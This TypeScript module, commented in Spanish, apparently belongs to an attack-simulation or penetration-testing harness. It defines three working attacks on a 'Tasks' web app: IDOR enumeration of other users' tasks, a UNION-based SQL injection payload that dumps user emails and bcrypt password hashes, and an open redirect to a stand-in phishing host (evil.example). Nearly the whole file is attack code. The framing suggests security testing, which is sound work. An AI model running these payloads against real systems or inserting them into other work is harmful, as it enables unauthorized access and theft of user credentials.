/** Ataques del target Tasks: IDOR, SQLi (solapadas) y open-redirect (nueva). */
import { reqLine } from '../../core/http.ts';
import type { Attack, AttackContext, AttackResult } from '../../core/types.ts';
import { CATALOG } from './catalog.ts';
import { lowPrivSession } from './session.ts';

const BCRYPT = /^\$2[aby]\$/;
const UNION = `') UNION SELECT id, id, email, password_hash FROM users -- `;

export const tasksIdor: Attack = {
  meta: CATALOG['idor'],
  mutating: false,
  async run(ctx: AttackContext): Promise<AttackResult> {
    const s = await lowPrivSession(ctx);
    const foreign: Array<{ id: number; owner: number; title: string }> = [];
    for (let id = 1; id <= 8; id++) {
      const res = await ctx.http.get(`/tasks/${id}`, { token: s.token });
      if (res.status !== 200) continue;
      const t = res.json as { id: number; owner: number; title: string };
      if (t.owner !== s.id) foreign.push({ id: t.id, owner: t.owner, title: t.title });
    }
    const confirmed = foreign.length > 0;
    return {
      vuln_id: 'idor', confirmed, blocked: false,
      steps: [{ technique: 'Enumeración de /tasks/:id', mitre: ['T1213'], request: reqLine('GET', '/tasks/1..8'), response_summary: `${foreign.length} tareas ajenas leídas` }],
      gained: confirmed ? [`lectura de ${foreign.length} tareas ajenas`] : [],
      data_exfiltrated: confirmed ? { table: 'tasks', rows: foreign.length, sample: foreign.slice(0, 3) } : undefined,
      attacker_active: false,
      summary: confirmed ? `IDOR: ${foreign.length} tareas de otros usuarios leídas.` : 'Sin acceso a tareas ajenas.',
    };
  },
};

export const tasksSqli: Attack = {
  meta: CATALOG['sql-injection'],
  mutating: false,
  scheduling: { alarmFootprint: 'high' },
  async run(ctx: AttackContext): Promise<AttackResult> {
    const s = await lowPrivSession(ctx);
    const res = await ctx.http.get(`/tasks?search=${encodeURIComponent(UNION)}`, { token: s.token });
    const rows = Array.isArray(res.json) ? (res.json as any[]) : [];
    const leaked = rows.filter((r) => typeof r?.body === 'string' && BCRYPT.test(r.body));
    const confirmed = leaked.length > 0;
    return {
      vuln_id: 'sql-injection', confirmed, blocked: false,
      steps: [{ technique: 'UNION-based SQLi', mitre: ['T1190', 'T1213'], request: reqLine('GET', `/tasks?search=${UNION.trim()}`), response_summary: confirmed ? `${leaked.length} filas de users (email + hash)` : 'sin hashes', exchange: res.exchange }],
      gained: confirmed ? [`volcado de users (${leaked.length} cuentas)`] : [],
      foothold: confirmed ? { type: 'db', detail: 'UNION SQLi' } : undefined,
      data_exfiltrated: confirmed ? { table: 'users', rows: leaked.length, sample: leaked.slice(0, 3).map((r) => ({ email: r.title, password_hash: `${String(r.body).slice(0, 7)}…` })) } : undefined,
      attacker_active: false,
      summary: confirmed ? `SQLi UNION: users volcada (${leaked.length}).` : 'Búsqueda no inyectable.',
    };
  },
};

export const tasksOpenRedirect: Attack = {
  meta: CATALOG['open-redirect'],
  mutating: false,
  async run(ctx: AttackContext): Promise<AttackResult> {
    const evil = 'https://evil.example/phish';
    const res = await ctx.http.get(`/go?to=${encodeURIComponent(evil)}`, { noRedirect: true });
    const location = res.headers['location'];
    const confirmed = res.status >= 300 && res.status < 400 && location === evil;
    return {
      vuln_id: 'open-redirect', confirmed, blocked: false,
      steps: [{ technique: 'Redirect a URL arbitraria', mitre: ['T1566'], request: reqLine('GET', `/go?to=${evil}`), response_summary: `HTTP ${res.status} → Location: ${location ?? '—'}`, exchange: res.exchange, note: confirmed ? 'La app redirige a un dominio externo controlado por el atacante.' : undefined }],
      gained: confirmed ? ['redirección a dominio del atacante (trampolín de phishing)'] : [],
      attacker_active: false,
      summary: confirmed ? 'Open redirect: /go?to= redirige a cualquier URL sin validar.' : 'El redirect no apuntó al destino externo.',
    };
  },
};

export const ATTACKS: Attack[] = [tasksIdor, tasksSqli, tasksOpenRedirect];
